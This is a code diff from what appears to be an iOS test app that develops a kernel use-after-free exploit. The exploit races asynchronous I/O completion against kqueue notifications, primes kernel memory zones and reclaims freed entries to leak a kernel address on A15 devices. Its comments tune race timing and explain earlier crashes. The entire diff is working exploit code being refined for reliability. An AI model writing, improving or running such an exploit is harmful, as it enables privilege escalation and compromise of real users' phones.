@@ -254,19 +254,13 @@ struct aio_race_state {
     ssize_t return_result;  // v47: aio_return result or aio_read errno (diagnostics)
 };
 
-// v75: v63 architecture + root-cause fix.
-// ROOT CAUSE (v64-v74): Waiting for rcbs[0] I/O completion before kevent64
-// GUARANTEES entry is freed+zeroed. zfree zeros procp → TAILQ_REMOVE(NULL+0x58)
-// → FAR=0x58 crash. v63 was reliable because F_NOCACHE kept rcbs[0] I/O slow
-// enough that kevent64 fired before worker completed. v74 broke this with
-// 64KB cached file (rcbs[0] I/O ~2us vs F_NOCACHE ~80us+).
-// FIX: Fire kevent64 IMMEDIATELY after reclaim — entry on workq, procp valid.
-//   - Single kqueue (v63 — no kq2, no dual-knote)
-//   - rcbs[0] SIGEV_NONE (v63 — no knote on reclaim entry)
-//   - F_NOCACHE + 32MB file → rcbs[0] NVMe read >80us
-//   - kevent64(kq) IMMEDIATELY after lio_listio reclaim (NO wait for rcbs)
-//   - Clean up rcbs AFTER kevent64
-//   - 7x priming, lio_listio batch reclaim, THREAD_PRECEDENCE_POLICY
+// v76: Faithful v63 clone — the only reliably working version on A15.
+// v63 had ~80% success rate. v64-v75 all degraded by adding unnecessary
+// complexity (dual-knote, F_NOCACHE, different racer timeouts, removing
+// the wait-for-reclaim loop). v76 restores v63 EXACTLY with one addition:
+// THREAD_PRECEDENCE_POLICY (importance=63).
+// v63 config: 500us racer, 64KB cached file, wait for reclaim entries,
+// kevent64 immediately after wait, 10s timeout.
 
 #define V63_NRECLAIM 7
 
@@ -349,15 +343,20 @@ static void *v63_racer(void *arg) {
     return NULL;
 }
 
-static void *v75_exploit_thread(void *arg) {
+// v76: Faithful v63 clone. v63 was the only version with reliable Phase A
+// on A15 (cold phone: ~80%+ success, hot phone: throttling widens race window).
+// v64-v75 all degraded by adding unnecessary complexity. v76 restores v63
+// exactly, with one addition: THREAD_PRECEDENCE_POLICY.
+static void *v76_exploit_thread(void *arg) {
     struct v63_state *st = (struct v63_state *)arg;
     aio_set_thread_affinity(42);
 
+    // v76: THREAD_PRECEDENCE_POLICY — v63 didn't have this, worth trying
     thread_precedence_policy_data_t prec = { .importance = 63 };
     thread_policy_set(mach_thread_self(), THREAD_PRECEDENCE_POLICY,
                       (thread_policy_t)&prec, THREAD_PRECEDENCE_POLICY_COUNT);
 
-    // 7x Zone priming.
+    // v63: 7x Zone priming.
     struct aiocb pcbs[7];
     char pbufs[7][256];
     for (int i = 0; i < 7; i++) {
@@ -375,11 +374,11 @@ static void *v75_exploit_thread(void *arg) {
         aio_return(&pcbs[i]);
     }
 
-    // Single kqueue — v63 architecture, no kq2.
+    // v63: Single kqueue.
     int kq = kqueue();
     if (kq < 0) { st->err = errno; return NULL; }
 
-    // tcb with SIGEV_KEVENT on kq — creates stale knote we'll read after reclaim.
+    // v63: tcb with SIGEV_KEVENT on kq.
     struct aiocb tcb;
     char tbuf[4096];
     memset(&tcb, 0, sizeof(tcb));
@@ -391,7 +390,7 @@ static void *v75_exploit_thread(void *arg) {
     tcb.aio_sigevent.sigev_notify = SIGEV_KEVENT;
     tcb.aio_sigevent.sigev_signo = kq;
 
-    // rcbs — ALL SIGEV_NONE (v63 architecture, no dual-knote).
+    // v63: ALL rcbs SIGEV_NONE, unique nbytes 8192+i for victim identification.
     struct aiocb rcbs[V63_NRECLAIM];
     char rbufs[V63_NRECLAIM][8256];
     for (int i = 0; i < V63_NRECLAIM; i++) {
@@ -404,13 +403,13 @@ static void *v75_exploit_thread(void *arg) {
         rcbs[i].aio_sigevent.sigev_notify = SIGEV_NONE;
     }
 
-    // Submit tcb.
+    // v63: Submit tcb via lio_listio.
     struct aiocb *ptr = &tcb;
     struct sigevent sig = {};
     sig.sigev_notify = SIGEV_NONE;
     lio_listio(LIO_NOWAIT, &ptr, 1, &sig);
 
-    // Start racer — detects tcb completion, does lio_listio batch reclaim.
+    // v63: Start racer.
     struct v63_race_state rs = {};
     rs.trigger = &tcb;
     rs.rcbs = rcbs;
@@ -420,15 +419,17 @@ static void *v75_exploit_thread(void *arg) {
     pthread_create(&thr, NULL, v63_racer, &rs);
     atomic_store_explicit(&rs.start, true, memory_order_release);
 
-    usleep(5000);
+    // v63: 500us racer timeout (NOT 5ms).
+    usleep(500);
     atomic_store_explicit(&rs.stop, true, memory_order_release);
     pthread_join(thr, NULL);
 
     int freed = atomic_load(&rs.freed);
     bool reclaimed = atomic_load(&rs.reclaim_done);
+    ssize_t ret_result = rs.return_result;
     st->freed = freed;
     st->reclaimed = reclaimed ? V63_NRECLAIM : 0;
-    st->return_result = rs.return_result;
+    st->return_result = ret_result;
 
     if (freed != 2) {
         while (aio_error(&tcb) == EINPROGRESS) usleep(500);
@@ -442,27 +443,32 @@ static void *v75_exploit_thread(void *arg) {
         return NULL;
     }
 
-    // v75 ROOT-CAUSE FIX: Fire kevent64 IMMEDIATELY after reclaim.
-    // DO NOT wait for rcbs[0] I/O completion — that guarantees zfree zeros
-    // the entry → procp=NULL → TAILQ_REMOVE(NULL+0x58) → FAR=0x58 crash.
-    // Instead, read the stale knote WHILE rcbs[0] is on workq (entry alive,
-    // procp valid). F_NOCACHE ensures rcbs[0]'s physical NVMe read >80us,
-    // while kevent64 with the already-posted knote returns in <1us.
+    // v63: Wait for ALL reclaim entries to complete (matching reference exploit).
+    for (int i = 0; i < V63_NRECLAIM; i++)
+        while (aio_error(&rcbs[i]) == EINPROGRESS) usleep(500);
+
+    // v63: kevent64 on THIS thread immediately after wait (matching v44/reference).
     struct kevent64_s kev = {};
-    struct timespec ts = {1, 0};  // knote already posted — returns immediately
+    struct timespec ts = {10, 0};  // v63: 10s timeout
     st->nev = kevent64(kq, NULL, 0, &kev, 1, 0, &ts);
     if (st->nev > 0) st->kev = kev;
 
     close(kq);
 
-    // Clean up reclaim entries AFTER kevent64 consumed the stale knote.
-    // Skip the entry that filt_aio_process already freed (matched by ext[1]).
-    uint64_t victimA = (st->nev > 0) ? st->kev.ext[1] : 0;
-    for (int i = 0; i < V63_NRECLAIM; i++) {
-        uint64_t my_nbytes = 8192 + i;
-        if (st->nev > 0 && victimA == my_nbytes) continue;
-        while (aio_error(&rcbs[i]) == EINPROGRESS) usleep(100);
-        aio_return(&rcbs[i]);
+    // v63: Smart cleanup — skip entry freed by filt_aio_process (matched by ext[1]).
+    if (st->nev > 0) {
+        uint64_t victim_nbytes = st->kev.ext[1];
+        for (int i = 0; i < V63_NRECLAIM; i++) {
+            uint64_t my_nbytes = 8192 + i;
+            if (victim_nbytes == my_nbytes) continue;
+            if (aio_error(&rcbs[i]) != EINVAL)
+                aio_return(&rcbs[i]);
+        }
+    } else {
+        for (int i = 0; i < V63_NRECLAIM; i++) {
+            if (aio_error(&rcbs[i]) != EINVAL)
+                aio_return(&rcbs[i]);
+        }
     }
 
     return NULL;
@@ -534,7 +540,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *aioConf = [UIButtonConfiguration filledButtonConfiguration];
     aioConf.baseBackgroundColor = [UIColor systemOrangeColor];
     self.aioUafButton.configuration = aioConf;
-    [self.aioUafButton setTitle:@"AIO UAF v75" forState:UIControlStateNormal];
+    [self.aioUafButton setTitle:@"AIO UAF v76" forState:UIControlStateNormal];
     [self.aioUafButton addTarget:self action:@selector(aioUafTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.aioUafButton];
 
@@ -6241,12 +6247,12 @@ static void *e2_free_and_ool_racer(void *arg) {
 
 // Phase 0 (pre-exploit): EMPTY — preserve pristine zone state
 - (void)runPhase0Dummy {
-    // v75: No probes. Keep zone state pristine for race reliability.
+    // v76: No probes. Keep zone state pristine for race reliability.
 }
 
 // Phase D (post-exploit): ALL leak probes — exploit done, zone disturbance irrelevant
 - (void)runPostExploitLeakProbe {
-    [self appendLog:@"\n=== Phase D v75: Post-Exploit Full Leak Probe ==="];
+    [self appendLog:@"\n=== Phase D v76: Post-Exploit Full Leak Probe ==="];
 
     [self appendLog:@"\n-- PhaseD.A: sysctl net.inet.tcp.info --"];
     @try { [self subtestSysctlTcpInfo]; }
@@ -6291,10 +6297,10 @@ static void *e2_free_and_ool_racer(void *arg) {
         _aioLast = now;
     }
 
-    [self appendLog:@"\n========== AIO UAF v75 (v63 Pure + F_NOCACHE + Immediate kevent64) =========="];
+    [self appendLog:@"\n========== AIO UAF v76 (Faithful v63 Clone + Thread Priority) =========="];
 
-    // ---- Phase 0 v75: Empty ----
-    [self appendLog:@"\n--- Phase 0 v75: (empty) ---"];
+    // ---- Phase 0 v76: Empty ----
+    [self appendLog:@"\n--- Phase 0 v76: (empty) ---"];
 
     // Disable button to prevent double-tap
     dispatch_async(dispatch_get_main_queue(), ^{
@@ -6306,28 +6312,27 @@ static void *e2_free_and_ool_racer(void *arg) {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
         @autoreleasepool {
 
-    // SINGLE file — all AIO ops use same fd
-    NSString *aioPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"aio_v75.bin"];
+    // v63: Single 64KB file, no F_NOCACHE (faithful v44/v58/v63 config).
+    NSString *aioPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"aio_v76.bin"];
     int fd = open(aioPath.UTF8String, O_CREAT | O_RDWR | O_TRUNC, 0644);
     if (fd < 0) {
         [self appendLog:@"FAIL: could not create file"];
         dispatch_async(dispatch_get_main_queue(), ^{
             self.aioUafButton.enabled = YES;
-            [self.aioUafButton setTitle:@"AIO UAF v75" forState:UIControlStateNormal];
+            [self.aioUafButton setTitle:@"AIO UAF v76" forState:UIControlStateNormal];
         });
         return;
     }
-    fcntl(fd, F_NOCACHE, 1);
     {
-        char fdata[262144];
+        char fdata[65536];
         memset(fdata, 'V', sizeof(fdata));
-        for (int i = 0; i < 128; i++) write(fd, fdata, sizeof(fdata));
+        write(fd, fdata, sizeof(fdata));
     }
-    [self appendLog:[NSString stringWithFormat:@"fd=%d(32MB F_NOCACHE) pid=%d uid=%d", fd, getpid(), getuid()]];
+    [self appendLog:[NSString stringWithFormat:@"fd=%d(64KB) pid=%d uid=%d", fd, getpid(), getuid()]];
 
     uint64_t entryAddr = 0;
-    // ---- Phase A v75: 7x prime → lio_listio → racer(5ms) → reclaim → IMMEDIATE kevent64(kq) ----
-    [self appendLog:@"\n--- Phase A v75: 7x prime → lio_listio → racer(5ms) → reclaim → IMMEDIATE kevent64(kq) ---"];
+    // ---- Phase A v76: v63 faithful — 7x prime → lio_listio trigger → racer(500us) → lio_listio batch reclaim → wait → kevent64 ----
+    [self appendLog:@"\n--- Phase A v76: 7x prime → lio_listio trigger → racer(500us) → lio_listio batch reclaim → wait → kevent64 ---"];
 
     bool phaseA_won = false;
     for (int attempt = 0; attempt < 10; attempt++) {
@@ -6337,7 +6342,7 @@ static void *e2_free_and_ool_racer(void *arg) {
         st.fd = fd;
 
         pthread_t thr;
-        pthread_create(&thr, NULL, v75_exploit_thread, &st);
+        pthread_create(&thr, NULL, v76_exploit_thread, &st);
         pthread_join(thr, NULL);
 
         if (st.err != 0) {
@@ -6388,8 +6393,8 @@ static void *e2_free_and_ool_racer(void *arg) {
 
     [self appendLog:[NSString stringWithFormat:@"\nWIN: entryAddr=0x%llx", entryAddr]];
 
-    // ---- Phase C v75: Health check ----
-    [self appendLog:@"\n--- Phase C v75: Health check ---"];
+    // ---- Phase C v76: Health check ----
+    [self appendLog:@"\n--- Phase C v76: Health check ---"];
     {
         struct aiocb hc[4];
         char hcbuf[4][256];
@@ -6415,11 +6420,11 @@ cleanup:
     close(fd);
     unlink(aioPath.UTF8String);
     [self appendLog:[NSString stringWithFormat:@"=== uid=%d gid=%d ===", getuid(), getgid()]];
-    [self appendLog:@"========== AIO UAF v75 Complete =========="];
+    [self appendLog:@"========== AIO UAF v76 Complete =========="];
             _aioRunning = 0;
             dispatch_async(dispatch_get_main_queue(), ^{
                 self.aioUafButton.enabled = YES;
-                [self.aioUafButton setTitle:@"AIO UAF v75" forState:UIControlStateNormal];
+                [self.aioUafButton setTitle:@"AIO UAF v76" forState:UIControlStateNormal];
             });
         }  // @autoreleasepool
     });  // dispatch_async
